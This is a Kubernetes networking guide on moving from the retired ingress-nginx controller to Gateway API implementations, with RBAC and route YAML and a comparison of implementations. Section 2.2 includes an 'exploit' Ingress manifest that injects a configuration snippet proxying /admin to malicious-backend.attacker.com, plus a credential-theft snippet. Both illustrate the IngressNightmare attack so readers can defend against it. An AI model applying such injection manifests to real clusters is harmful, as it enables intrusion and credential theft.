---
title: "Gateway API Adoption Guide: From NGINX Ingress to Next-Generation Traffic Management"
description: NGINX Ingress Controller EOL response, tiered gateways for agentic workloads, Gateway API architecture, GAMMA Initiative, AWS Native vs open source solution comparison (AWS LBC, Cilium, NGINX Gateway Fabric, Envoy Gateway, kGateway, Kong), Cilium ENI integration, migration strategy and benchmark plans
created: "2026-02-14"
last_update:
  date: 2026-10-28
  author: devfloor9
reading_time: 78
tags:
  - eks
  - gateway-api
  - nginx
  - cilium
  - envoy
  - kong
  - networking
  - migration
  - ebpf
  - gamma
  - scope:nav
sidebar_label: Gateway API Adoption Guide
category: performance-networking
---

import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';
import GatewayApiBenefits from '@site/src/components/GatewayApiBenefits';
import {
  DocumentStructureTable,
  RiskAssessmentTable,
  ArchitectureComparisonTable,
  RoleSeparationTable,
  GaStatusTable,
  FeatureComparisonMatrix,
  SolutionOverviewMatrix,
  SolutionSelectorCards,
  TieredGatewayDiagram,
  ScenarioRecommendationTable,
  FeatureMappingTable,
  DifficultyComparisonTable,
  AwsCostTable,
  OpenSourceCostTable,
  CostComparisonTable,
  MigrationFeatureMappingTable,
  TroubleshootingTable,
  RouteRecommendationTable,
  RoadmapTimeline,
} from '@site/src/components/GatewayApiTables';

# Gateway API Adoption Guide

> **📌 Reference Versions**: Gateway API v1.5.1, Cilium v1.19.0, EKS 1.33+, AWS LBC v3.0.0, Envoy Gateway v1.7.0

## 1. Overview

Two common reasons to evaluate Gateway API are replacing an existing Ingress controller and designing routing for LLM inference traffic.

**Replacing ingress-nginx.** The Kubernetes community's ingress-nginx project ended maintenance in March 2026. It no longer receives bug fixes or security updates, so teams using that controller should migrate to a Gateway API implementation or another supported Ingress controller. The Ingress API itself has not been retired. See the [official retirement notice](https://kubernetes.io/blog/2025/11/11/ingress-nginx-retirement/) for the scope of the change.

**Handling LLM inference traffic.** In addition to general web/API routing, an application may need token-based metering and rate limits, model selection, cache-aware load balancing, and prompt/response checks. The two-tier design below separates a **general gateway receiving traffic from outside the cluster** from an **inference gateway distributing requests to inference pods**. Gateway API describes gateway and route configuration; the [Gateway API Inference Extension](https://gateway-api-inference-extension.sigs.k8s.io/) extends it for inference targets and routing. Check the chosen implementation separately for metering and guardrail support.

This guide covers Gateway API architecture, comparison of 6 major implementations (AWS LBC v3, Cilium, NGINX Gateway Fabric, Envoy Gateway, kGateway, Kong), Cilium ENI mode deep-dive configuration, step-by-step migration execution strategy, and performance benchmark plans. The detailed design of the inference gateway layer for agentic workloads is covered in the [Agentic AI Platform — Inference Gateway reference](/docs/agentic-ai-platform/reference-architecture/inference-gateway).

:::tip General Gateway vs Inference Gateway — which to read
- Designing **North-South traffic, NGINX Ingress replacement, general API routing** → this document (general Gateway API layer)
- Designing **LLM inference pod routing, KV-cache-aware distribution, model endpoint management** → [Inference Gateway reference](/docs/agentic-ai-platform/reference-architecture/inference-gateway)
- If your design separates these roles, use the Section 4 comparison to select **the implementation for each layer**.
:::

### 1.1 Target Audience

- **EKS cluster administrators running NGINX Ingress Controller**: EOL response strategy
- **Platform engineers building agentic AI platforms**: general gateway + inference gateway 2-tier design
- **Platform engineers planning Gateway API migration**: technology selection and PoC
- **Architects reviewing traffic management modernization**: long-term roadmap design
- **Network engineers considering Cilium ENI mode + Gateway API integration**: eBPF-based high-performance networking

### 1.2 Tiered Gateway at a Glance

<TieredGatewayDiagram locale="en" />

### 1.3 Document Structure

<DocumentStructureTable locale="en" />

:::info Reading Strategy
- **Quick understanding**: Sections 1-3, 6 (~10 min)
- **Technology selection**: Sections 1-4, 6 (~20 min)
- **Full migration**: Entire document + sub-documents (~25 min)
:::

---

## 2. NGINX Ingress Controller Retirement — Why Migration Is Mandatory

### 2.1 EOL Timeline

**Figure 1. NGINX Ingress Controller EOL and migration timeline**

```mermaid
gantt
    title NGINX Ingress Controller EOL and Migration Timeline
    dateFormat YYYY-MM
    axisFormat %Y-%m

    section Security Events
    IngressNightmare CVE-2025-1974 :milestone, cve, 2025-03, 0d

    section Official Announcements
    Retirement discussion accelerates :active, disc, 2025-03, 8M
    Official retirement announcement :milestone, retire, 2025-11, 0d
    Official EOL (maintenance ends) :crit, milestone, eol, 2026-03, 0d

    section Migration Phases
    Phase 1 planning and PoC :plan, 2025-01, 6M
    Phase 2 parallel operation :parallel, 2025-07, 6M
    Phase 3 cutover complete :switch, 2026-01, 3M
```

**Key events in detail:**

- **March 2025**: IngressNightmare disclosed — a cluster of vulnerabilities letting an unauthenticated attacker with pod-network access run remote code in the ingress-nginx controller pod via its admission webhook. It is an attack chain combining config-injection flaws (CVE-2025-1097, CVE-2025-1098, CVE-2025-24514) with the admission-webhook RCE (CVE-2025-1974), and it accelerated retirement discussions in the Kubernetes SIG Network. Fixed in v1.11.5 and v1.12.1
- **November 2025**: Kubernetes SIG Network officially announced the retirement of the NGINX Ingress Controller, citing insufficient maintainers (1-2) and Gateway API maturity as the main reasons
- **March 2026**: Official EOL — security patches and bug fixes cease completely. Continued production use after this date risks compliance violations

:::danger Mandatory Action
**After March 2026, the community ingress-nginx controller receives no security patches.** Standards such as PCI-DSS, SOC 2, and ISO 27001 require not running unsupported software in production, so migrate to a supported Ingress controller or a Gateway API implementation. This is not a requirement to adopt any specific technology.
:::

### 2.2 Security Vulnerability Analysis

**IngressNightmare (CVE-2025-1974) attack scenario:**

<Tabs>
  <TabItem value="attack-overview" label="Attack Overview" default>

  **Figure 2. IngressNightmare (CVE-2025-1974) attack overview**

  ![IngressNightmare attack overview](/img/infrastructure-optimization/ingressnightmare-attack-overview.png)

  *An unauthenticated remote code execution (RCE) attack vector targeting the Ingress NGINX Controller inside a Kubernetes cluster. An attacker with pod-network access runs code in the controller pod via a malicious Admission Review; in a default install this exposes the cluster-wide Secrets the controller can access. Subsequent lateral movement depends on the credentials obtained, RBAC permissions, and network reachability. (Source: [Wiz Research](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities))*

  </TabItem>
  <TabItem value="architecture" label="Controller Architecture">

  **Figure 3. Ingress NGINX Controller internal architecture and attack surface**

  ![Ingress NGINX Controller internal architecture](/img/infrastructure-optimization/ingress-nginx-controller-architecture.png)

  *Internal architecture of the Ingress NGINX Controller pod. The path where the Admission Webhook injects an attacker's malicious config into NGINX during config validation is the core attack surface of CVE-2025-1974. (Source: [Wiz Research](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities))*

  </TabItem>
  <TabItem value="exploit-code" label="Exploit Code Example">

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: malicious-ingress
  annotations:
    # Attacker injects arbitrary NGINX config
    nginx.ingress.kubernetes.io/configuration-snippet: |
      location /admin {
        proxy_pass http://malicious-backend.attacker.com;
        # Enables auth bypass, data theft, backdoor installation
      }
spec:
  ingressClassName: nginx
  rules:
  - host: production-api.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: production-service
            port:
              number: 80
```

  </TabItem>
</Tabs>

**Risk assessment:**

<RiskAssessmentTable locale="en" />

:::warning If You Are Currently Operating
To address IngressNightmare as a whole, upgrade ingress-nginx to v1.11.5 or v1.12.1 (or later) and isolate the admission-webhook endpoint from network access outside the Kubernetes API server (the key mitigation for the admission-webhook RCE, CVE-2025-1974). For the config-injection flaws (CVE-2025-1097/1098/24514), restricting the `nginx.ingress.kubernetes.io/configuration-snippet` and `nginx.ingress.kubernetes.io/server-snippet` annotations via an admission policy is also recommended. Because the controller is end-of-maintenance, plan migration to a supported controller or a Gateway API implementation as well.
:::

### 2.3 Structural Resolution Through Gateway API

The Gateway API reduces the structural vulnerabilities of NGINX Ingress through typed fields and per-resource ownership separation. However, ExtensionRef and implementation-specific extensions (such as snippets) remain supported, so RBAC/admission policies and the security of the implementation itself are still prerequisites.

<ArchitectureComparisonTable locale="en" />

<Tabs>
<TabItem value="nginx" label="❌ NGINX Ingress Vulnerability" default>

**1. Configuration Snippet Injection Attack**

NGINX Ingress allows arbitrary strings to be injected into annotations, creating serious security risks:

**Figure 4. Arbitrary configuration injection path through NGINX Ingress annotations**

```mermaid
flowchart LR
    subgraph nginx["NGINX Ingress Attack Path"]
        direction TB
        ann["annotations:<br/>configuration-snippet"]
        ann -->|"arbitrary string"| inject["arbitrary NGINX config injection"]
        inject -->|"no validation"| danger["security risk<br/>(CVE-2021-25742)"]
    end

    style nginx fill:#ffebee,stroke:#c62828
    style danger fill:#ef5350,color:#fff
```

```yaml
# ❌ NGINX Ingress — arbitrary string injection possible
annotations:
  nginx.ingress.kubernetes.io/configuration-snippet: |
    # Can steal credentials of adjacent services (CVE-2021-25742)
    proxy_set_header Authorization "stolen-token";
```

**2. All Permissions Concentrated in a Single Resource**

- A single Ingress resource mixes routing, TLS, security, and extension settings
- RBAC separation at the annotation level is impossible — it is all-or-nothing Ingress permission
- A developer who only wants to modify routing also holds the permission to change TLS/security settings

**3. Vendor Annotation Dependency**

- Features not in the standard are added via vendor-specific annotations → **loss of portability**
- Difficult to debug when annotations conflict
- Increasing complexity of managing 100+ vendor annotations

These structural problems make it hard for NGINX Ingress to meet production security requirements.

</TabItem>
<TabItem value="gateway" label="✅ Gateway API Structural Resolution">

**1. 3-Tier Role Separation Eliminates Snippets at the Source**

**Figure 5. Gateway API 3-tier role separation**

```mermaid
flowchart TB
    subgraph cluster["Gateway API 3-Tier Role Separation"]
        direction TB
        infra["Infrastructure Team<br/>(ClusterRole)"]
        platform["Platform Team<br/>(Role per NS)"]
        app["Application Team<br/>(Role per NS)"]

        infra -->|"manages"| gc["GatewayClass<br/>(cluster scope)"]
        platform -->|"manages"| gw["Gateway<br/>(namespace scope)"]
        app -->|"manages"| hr["HTTPRoute<br/>(namespace scope)"]
    end

    gc --> gw --> hr

    style infra fill:#e53935,color:#fff
    style platform fill:#fb8c00,color:#fff
    style app fill:#43a047,color:#fff
```

Each team is separated to manage resources only within its own permission scope. The Role/ClusterRole below are illustrative fragments showing permission scope; to apply them in practice you also need a RoleBinding or ClusterRoleBinding that binds each to its target subject (ServiceAccount/group).

```yaml
# Infrastructure team: manages GatewayClass (cluster-level permission)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: infrastructure-team
rules:
- apiGroups: ["gateway.networking.k8s.io"]
  resources: ["gatewayclasses"]
  verbs: ["create", "update", "delete"]
---
# Platform team: manages Gateway (namespace-level permission)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: platform-team
  namespace: platform-system
rules:
- apiGroups: ["gateway.networking.k8s.io"]
  resources: ["gateways"]
  verbs: ["create", "update", "delete"]
---
# Application team: manages HTTPRoute only (controls routing rules only)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-team
  namespace: app-namespace
rules:
- apiGroups: ["gateway.networking.k8s.io"]
  resources: ["httproutes"]
  verbs: ["create", "update", "delete"]
```

**2. Structural Validation Based on CRD Schema**

Predefining fields with an OpenAPI schema means core routing resources cannot carry arbitrary config outside the schema. However, configuration paths via ExtensionRef or implementation-specific extensions still remain and must be controlled with RBAC and implementation security:

**Figure 6. HTTPRoute validation flow based on the OpenAPI schema**

```mermaid
flowchart LR
    subgraph gw["Gateway API Validation Flow"]
        direction TB
        crd["HTTPRoute CRD"]
        crd -->|"OpenAPI schema"| validate["structural validation"]
        validate -->|"predefined fields only"| safe["safe"]
    end

    style gw fill:#e8f5e9,stroke:#2e7d32
    style safe fill:#66bb6a,color:#fff
```

```yaml
# ✅ Gateway API — schema-validated field example (partial fragment: real use needs metadata.name and parentRefs)
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
spec:
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /api
    filters:
    - type: RequestHeaderModifier  # only predefined filters can be used
      requestHeaderModifier:
        add:
        - name: X-Custom-Header
          value: production
```

**3. Safe Extension via the Policy Attachment Pattern**

Extension features are separated into dedicated Policy resources, with access controlled by RBAC:

**Figure 7. Extension features separated into a dedicated Policy resource with RBAC access control**

```mermaid
flowchart TB
    gw["Gateway"] --> hr["HTTPRoute"]
    hr --> svc["Service<br/>(app: api-gateway)"]

    policy["CiliumNetworkPolicy<br/>(separate Policy resource)"]
    policy -.->|"access controlled<br/>by RBAC"| svc

    subgraph policy_detail["Policy Contents"]
        direction LR
        l7["L7 security policy"]
        method["HTTP method/path restriction<br/>(GET /api/*)"]
        header["header-based filter"]
    end

    policy --> policy_detail

    style policy fill:#ce93d8,stroke:#7b1fa2
    style policy_detail fill:#f3e5f5,stroke:#7b1fa2
```

```yaml
# Apply L7 (HTTP) access control with Cilium's CiliumNetworkPolicy
# Note: CiliumNetworkPolicy http rules support method/path/header matching and
# have no request rate-limit field. For rate limiting, use an implementation-specific
# mechanism such as an Envoy-based L7 policy separately.
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: api-l7-access
spec:
  endpointSelector:
    matchLabels:
      app: api-gateway
  ingress:
  - fromEndpoints:
    - matchLabels:
        role: frontend
    toPorts:
    - ports:
      - port: "80"
        protocol: TCP
      rules:
        http:
        - method: "GET"
          path: "/api/.*"
```

</TabItem>
</Tabs>

:::info Active Community Support
- **15+ production implementations**: AWS, Google Cloud, Cilium, Envoy, NGINX, Istio, and more
- **Regular quarterly releases**: GA resources included as of v1.5.1
- **Official CNCF project**: development led by the Kubernetes SIG Network
:::

---

## 3. Gateway API — The Next-Generation Traffic Management Standard

### 3.1 Gateway API Architecture

**Figure 8. Gateway API role-based model**

![Gateway API role-based model — Source: gateway-api.sigs.k8s.io](https://gateway-api.sigs.k8s.io/images/gateway-roles.png)

*Source: [Kubernetes Gateway API official documentation](https://gateway-api.sigs.k8s.io/) — three roles (Infrastructure Provider, Cluster Operator, Application Developer) manage GatewayClass, Gateway, and HTTPRoute respectively*

:::tip Detailed Comparison
The architecture comparison between NGINX Ingress and the Gateway API is available tab-by-tab in [2.3 Structural Resolution Through Gateway API](#23-structural-resolution-through-gateway-api).
:::

### 3.2 3-Tier Resource Model

The Gateway API separates responsibilities across the following layered structure:

<Tabs>
  <TabItem value="overview" label="Role Overview" default>

  **Figure 9. Gateway API resource model layered structure**

  ![Gateway API resource model — Source: gateway-api.sigs.k8s.io](https://gateway-api.sigs.k8s.io/images/resource-model.png)

  *Source: [Kubernetes Gateway API official documentation](https://gateway-api.sigs.k8s.io/docs/concepts/api-overview/) — GatewayClass → Gateway → xRoute → Service layered structure*

  <RoleSeparationTable locale="en" />

  </TabItem>
  <TabItem value="infra" label="Infrastructure Team (GatewayClass)">

  **Infrastructure team: GatewayClass-only permission (ClusterRole)**

  GatewayClass is a cluster-scoped resource that only the infrastructure team can create/modify. It handles controller selection and global policies.

  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRole
  metadata:
    name: infrastructure-gateway-manager
  rules:
  - apiGroups: ["gateway.networking.k8s.io"]
    resources: ["gatewayclasses"]
    verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
  ```

  </TabItem>
  <TabItem value="platform" label="Platform Team (Gateway)">

  **Platform team: Gateway management permission (Role — namespace scope)**

  Gateway is a namespace-scoped resource where the platform team manages listener configuration, TLS certificates, and load balancer settings.

  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: Role
  metadata:
    name: platform-gateway-manager
    namespace: gateway-system
  rules:
  - apiGroups: ["gateway.networking.k8s.io"]
    resources: ["gateways"]
    verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
  - apiGroups: [""]
    resources: ["secrets"]  # TLS certificate management
    verbs: ["get", "list"]
  ```

  </TabItem>
  <TabItem value="app" label="App Team (HTTPRoute)">

  **Application team: manages HTTPRoute only (Role — namespace scope)**

  The application team manages only HTTPRoute and ReferenceGrant within its own namespace. It cannot access GatewayClass or Gateway.

  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: Role
  metadata:
    name: app-route-manager
    namespace: production-app
  rules:
  - apiGroups: ["gateway.networking.k8s.io"]
    resources: ["httproutes", "referencegrants"]
    verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
  - apiGroups: [""]
    resources: ["services"]
    verbs: ["get", "list"]
  ```

  </TabItem>
</Tabs>

### 3.3 GA Status (v1.5.1) {#33-ga-status-v140}

The Gateway API is divided into a Standard Channel and an Experimental Channel, with maturity differing per resource:

<GaStatusTable locale="en" />

:::warning Experimental Channel Caution
Alpha-status resources have **no API compatibility guarantee** and may have fields changed or removed on minor version upgrades. In production environments, using only GA/Beta resources from the Standard channel is recommended.
:::

### 3.4 Key Benefits

The 6 key benefits of the Gateway API are presented with visual diagrams and YAML examples.

<GatewayApiBenefits />

### 3.5 Basic Resource Examples

The deployment order of Gateway API resources used in real production environments:

<Tabs>
  <TabItem value="overview" label="Deployment Flow" default>

**Figure 10. Deployment flow of the basic Gateway API resources**

```mermaid
flowchart LR
    step1["Step 1<br/>GatewayClass<br/>(Infra Team)"]
    step2["Step 2<br/>Gateway<br/>(Platform Team)"]
    step3["Step 3<br/>HTTPRoute<br/>(App Team)"]
    step4["Step 4<br/>ReferenceGrant<br/>(cross-NS)"]
    step5["Step 5<br/>deploy and verify"]

    step1 --> step2 --> step3
    step2 --> step4
    step3 --> step5
    step4 --> step5

    style step1 fill:#e53935,color:#fff
    style step2 fill:#fb8c00,color:#fff
    style step3 fill:#43a047,color:#fff
    style step4 fill:#1e88e5,color:#fff
    style step5 fill:#8e24aa,color:#fff
```

Gateway API resources are deployed separately by role. The infrastructure team manages the GatewayClass, the platform team the Gateway, and the app team the HTTPRoute.

  </TabItem>
  <TabItem value="step1" label="Step 1: GatewayClass">

**GatewayClass definition (infrastructure team)**

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: GatewayClass
metadata:
  name: aws-alb-gateway-class
spec:
  controllerName: gateway.k8s.aws/alb
  description: "AWS Application Load Balancer (L7) for HTTPRoute/GRPCRoute"
  parametersRef:
    group: gateway.k8s.aws
    kind: LoadBalancerConfiguration
    name: alb-gateway-config
    namespace: gateway-system
```

  </TabItem>
  <TabItem value="step2" label="Step 2: Gateway">

**Gateway creation (platform team)**

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: production-gateway
  namespace: gateway-system
spec:
  gatewayClassName: aws-alb-gateway-class
  # ALB settings are specified via LoadBalancerConfiguration, not Service annotations.
  infrastructure:
    parametersRef:
      group: gateway.k8s.aws
      kind: LoadBalancerConfiguration
      name: alb-gateway-config
  listeners:
  # HTTP Listener (HTTPS redirect via a separate HTTPRoute RequestRedirect filter, see Step 3)
  - name: http
    protocol: HTTP
    port: 80
    allowedRoutes:
      namespaces:
        from: All  # the redirect HTTPRoute in Step 3 lives in production-app, so this listener must also accept routes from other namespaces

  # HTTPS Listener (ACM certificate is set in LoadBalancerConfiguration)
  - name: https
    protocol: HTTPS
    port: 443
    allowedRoutes:
      namespaces:
        from: All  # allow HTTPRoutes from all namespaces
---
# LoadBalancerConfiguration — sets ALB scheme/type and the ACM certificate (ARN)
apiVersion: gateway.k8s.aws/v1
kind: LoadBalancerConfiguration
metadata:
  name: alb-gateway-config
  namespace: gateway-system
spec:
  scheme: internet-facing
  listenerConfigurations:
    - protocolPort: HTTPS:443
      # certificateRefs (Secret) is not supported by the LBC ALB Gateway.
      # Specify the ACM certificate by ARN, or let it be discovered via listener/route hostname.
      defaultCertificate: <ACM certificate ARN>
```

  </TabItem>
  <TabItem value="step3" label="Step 3: HTTPRoute">

**HTTPRoute configuration (application team)**

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: backend-api
  namespace: production-app
spec:
  parentRefs:
  - name: production-gateway
    namespace: gateway-system
    sectionName: https

  hostnames:
  - "api.example.com"

  rules:
  # Canary deployment (90% v1, 10% v2)
  - matches:
    - path:
        type: PathPrefix
        value: /api
    backendRefs:
    - name: backend-v1
      port: 8080
      weight: 90
    - name: backend-v2
      port: 8080
      weight: 10

    filters:
    # Add header
    - type: RequestHeaderModifier
      requestHeaderModifier:
        add:
        - name: X-Backend-Version
          value: canary

    # URL Rewrite
    - type: URLRewrite
      urlRewrite:
        path:
          type: ReplacePrefixMatch
          replacePrefixMatch: /v1/api
---
# Redirect requests arriving on the HTTP listener to HTTPS (explicit route, not automatic)
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: http-to-https-redirect
  namespace: production-app
spec:
  parentRefs:
  - name: production-gateway
    namespace: gateway-system
    sectionName: http
  rules:
  - filters:
    - type: RequestRedirect
      requestRedirect:
        scheme: https
        statusCode: 301
```

  </TabItem>
  <TabItem value="step4" label="Step 4: ReferenceGrant">

**ReferenceGrant (cross-namespace reference)**

Attaching an HTTPRoute to a Gateway (route attachment) is authorized by the Gateway's `allowedRoutes`, not by a ReferenceGrant (see `from: All` in Step 2). A ReferenceGrant authorizes an HTTPRoute to reference a **backend (Service) or certificate in another namespace**. The example below lets an HTTPRoute in `production-app` reference a Service in `backend-ns` as a backendRef.

```yaml
# Allow an HTTPRoute in production-app to reference Services in backend-ns
apiVersion: gateway.networking.k8s.io/v1beta1
kind: ReferenceGrant
metadata:
  name: allow-routes-to-backend-ns
  namespace: backend-ns
spec:
  from:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    namespace: production-app
  to:
  - group: ""
    kind: Service
```

  </TabItem>
  <TabItem value="step5" label="Step 5: Verification">

**Deployment and verification**

```bash
# Deploy resources
kubectl apply -f gatewayclass.yaml
kubectl apply -f gateway.yaml
kubectl apply -f referencegrant.yaml
kubectl apply -f httproute.yaml

# Check Gateway status
kubectl get gateway production-gateway -n gateway-system
# NAME                  CLASS                   ADDRESS          PROGRAMMED   AGE
# production-gateway    aws-alb-gateway-class   a1b2c3.elb.aws   True         5m

# Check HTTPRoute status
kubectl get httproute backend-api -n production-app
# NAME          HOSTNAMES              AGE
# backend-api   ["api.example.com"]    2m

# Check Gateway address
kubectl get gateway production-gateway -n gateway-system \
  -o jsonpath='{.status.addresses[0].value}'

# Traffic test (verify canary ratio)
for i in {1..100}; do
  curl -s https://api.example.com/api/health | jq -r '.version'
done | sort | uniq -c
# Example output:
#   90 v1
#   10 v2
```

  </TabItem>
</Tabs>

:::tip Native Canary Deployment
The Gateway API supports canary deployment without annotations via the `weight` field. It is more concise and more portable than NGINX Ingress's `nginx.ingress.kubernetes.io/canary` annotation combination.
:::

## 4. Gateway API Implementation Comparison — AWS Native vs Open Source

This section compares 6 major Gateway API implementations in detail. It helps make the optimal choice for an organization by clarifying each solution's characteristics, strengths, and weaknesses.

:::note Positioning Kong — policy model and AI Gateway distinction
Kong is a mature OpenResty (NGINX + Lua) based API gateway whose KIC (Kong Ingress Controller) is conformant to the Gateway API Standard channel at the Core level. However, most L7 policies (auth, rate limiting, IP control) are implemented via **KongPlugin CRDs** rather than native Gateway API resources (a 100+ plugin ecosystem). Also, Kong's **AI Gateway** is an **LLM API gateway** that proxies external LLM providers — a **different layer** from the in-cluster inference pod routing (Gateway API Inference Extension, kgateway family) covered by this guide. The tables reflect this distinction explicitly.
:::

### 4.1 Solutions at a Glance

Before the detailed comparison, the cards below summarize each of the 6 solutions' data plane, best-fit scenario, strength, and watch-outs. Grasping the big picture first, then drilling into the matrices below, is the recommended order.

<SolutionSelectorCards locale="en" />

### 4.2 Solution Overview

The following matrix compares the key features, limitations, and best use cases of the 6 Gateway API implementations.

<SolutionOverviewMatrix locale="en" />

### 4.3 Feature Comparison Matrix

The following is a comprehensive comparison of the 6 solutions. This table makes each solution's strengths and weaknesses clear at a glance.

<FeatureComparisonMatrix locale="en" />

### 4.4 NGINX Feature Mapping

This compares how the 8 major features used in the NGINX Ingress Controller are implemented in each Gateway API implementation.

<FeatureMappingTable locale="en" />

**Legend**:
- ✅ Native support (no separate tooling needed)
- ⚠️ Partial support or additional configuration required
- ❌ Not supported (separate solution required)

### 4.5 Implementation Difficulty

<DifficultyComparisonTable locale="en" />

### 4.6 Cost Impact Analysis

<CostComparisonTable locale="en" />

:::tip Cost Optimization Tips
- **If you run several WAF rules**, bundling them in a single WebACL (AWS Native) can be operationally convenient. Cost advantage, however, depends not only on rule count but also on traffic volume (per-request billing) and operational effort, and must be estimated per environment
- **Open source solutions (Cilium, Envoy Gateway)** can implement policies at no extra billing, but you must also account for self-operation cost (nodes, upgrades, monitoring)
- **For performance-sensitive workloads**, Cilium's L3/L4 packet forwarding runs in the kernel via eBPF, giving low latency. HTTP (L7) routing and policy, however, are handled by a user-space proxy such as Envoy/NGINX, which is not the same as kernel processing. Measure the latency of each path separately under the actual configuration and load
:::

### 4.7 Per-Feature Implementation Code Examples

The implementation of the following 8 features as YAML examples per implementation is provided in a separate cookbook document. This guide focuses on comparison and selection; refer to the cookbook for actual manifests.

**Table 1. The eight features provided in the cookbook and their standard status**

| # | Feature | Standard? |
|---|---------|-----------|
| 1 | Authentication (Basic Auth replacement) | Per-implementation |
| 2 | Rate Limiting | Per-implementation |
| 3 | IP Control (IP Allowlist) | Per-implementation |
| 4 | URL Rewrite | Gateway API v1 standard |
| 5 | Header Manipulation | Gateway API v1 standard |
| 6 | Session Affinity (cookie-based) | Per-implementation |
| 7 | Request Body Size Limit | Per-implementation |
| 8 | Custom Error Pages | Per-implementation |

:::tip View all implementation examples
The YAML manifests for each feature across AWS LBC, Cilium, NGINX GF, Envoy Gateway, and kGateway are available in the **[Feature Implementation Cookbook](/docs/eks-best-practices/networking-performance/gateway-api-adoption-guide/feature-implementation-cookbook)**.
:::

### 4.8 Solution Selection Decision Tree

The following decision tree helps select the optimal solution for an organization.

**Figure 11. Implementation selection decision tree**

```mermaid
flowchart TD
    start([Start Migration]) --> q1{AWS service integration<br/>is critical?}

    q1 -->|Yes| q2{Minimize<br/>operational burden?}
    q1 -->|No| q3{Service mesh<br/>planned?}

    q2 -->|Yes| aws["✅ AWS Native<br/>(LBC v3 + ALB)"]
    q2 -->|No| q4{High-performance<br/>eBPF needed?}

    q4 -->|Yes| cilium["✅ Cilium<br/>Gateway API"]
    q4 -->|No| aws

    q3 -->|Yes| q5{AI/ML workload<br/>routing needed?}
    q3 -->|No| q8{Existing Kong/API mgmt<br/>or external LLM API proxy?}

    q5 -->|Yes| q5a{In-cluster inference pods<br/>vs external LLM API?}
    q5 -->|No| q7{Istio<br/>planned?}

    q5a -->|"In-cluster pods"| kgw["✅ kGateway<br/>(Inference Extension)"]
    q5a -->|"External LLM API"| kong["✅ Kong<br/>(AI Gateway)"]

    q7 -->|Yes| envoy["✅ Envoy Gateway"]
    q7 -->|No| cilium

    q8 -->|Yes| kong
    q8 -->|No| q6{Leverage NGINX<br/>experience?}

    q6 -->|Yes| nginx["✅ NGINX Gateway<br/>Fabric"]
    q6 -->|No| envoy

    style start fill:#f5f5f5,stroke:#333
    style aws fill:#e6ffe6,stroke:#009900
    style cilium fill:#e6f3ff,stroke:#0066cc
    style nginx fill:#fff0e6,stroke:#cc6600
    style envoy fill:#ffe6e6,stroke:#cc0000
    style kgw fill:#f0e6ff,stroke:#6600cc
    style kong fill:#e0f7f5,stroke:#00b9aa
```

### 4.9 Scenario-Based Recommendations

The following are recommended solutions for common organizational scenarios.

<ScenarioRecommendationTable locale="en" />

---

## 5. Benchmark Comparison Plan

The benchmark report adds Istio and Traefik to this guide's six implementations and treats VPC Lattice as a separate path. It separates managed edge, in-cluster proxies, and CNI/mesh paths when planning throughput, latency, TLS, L7 routing, scaling, resource efficiency, failure recovery, and gRPC tests. Published conformance evidence and the local measurement kit have been validated; actual EKS performance measurements remain pending.

:::info Benchmark Details
Architecture comparisons, raw validation evidence, and the execution plan are available in the **[Gateway API Feature and Performance Comparison Report](/docs/benchmarks/gateway-api-benchmark)**.
:::

---

## 6. Conclusion and Roadmap

### 6.1 Conclusion

<RouteRecommendationTable locale="en" />

Select the solution that fits your organizational environment based on the table above.

<Tabs>
  <TabItem value="aws" label="AWS-only Environment" default>

**AWS Native (LBC v3)** — minimal operational burden, leverages the managed nature of ALB/NLB, SLA guarantee, AWS WAF/Shield/ACM integration. Optimal for environments where stability and automatic scaling matter more than raw performance.

  </TabItem>
  <TabItem value="cilium" label="High Performance + Observability">

**Cilium Gateway API** — an option for combining eBPF networking, Envoy L7 processing, Hubble visibility, and ENI-mode VPC integration. Measure latency and efficiency under the actual CNI/proxy configuration and workload.

  </TabItem>
  <TabItem value="nginx" label="Leverage NGINX Experience">

**NGINX Gateway Fabric** — leverages existing NGINX knowledge, proven stability, F5 enterprise support, multi-cloud. Optimal for NGINX-experienced teams that need a fast transition.

  </TabItem>
  <TabItem value="envoy" label="CNCF Standard">

**Envoy Gateway** — CNCF standard, Istio compatible, rich L7 features (mTLS, ExtAuth, Rate Limiting, Circuit Breaking). Optimal for environments planning service mesh expansion.

  </TabItem>
  <TabItem value="kgateway" label="AI/ML Integration">

**kGateway** — unified gateway (API+mesh+AI+MCP), AI/ML workload routing, Solo.io enterprise support. Optimal for environments that need AI/ML-specialized routing.

  </TabItem>
  <TabItem value="kong" label="Enterprise API Management">

**Kong** — OpenResty (NGINX + Lua) based, 100+ KongPlugin ecosystem, enterprise 24x7 support (Enterprise/Konnect). Optimal for environments that leverage plugin-rich API management and existing Kong investments. Kong AI Gateway is an LLM API gateway that proxies external LLM providers, distinct in purpose from in-cluster inference pod routing (kgateway family). Consider that most L7 policies are configured via KongPlugin rather than native Gateway API resources.

  </TabItem>
  <TabItem value="hybrid" label="Hybrid Nodes">

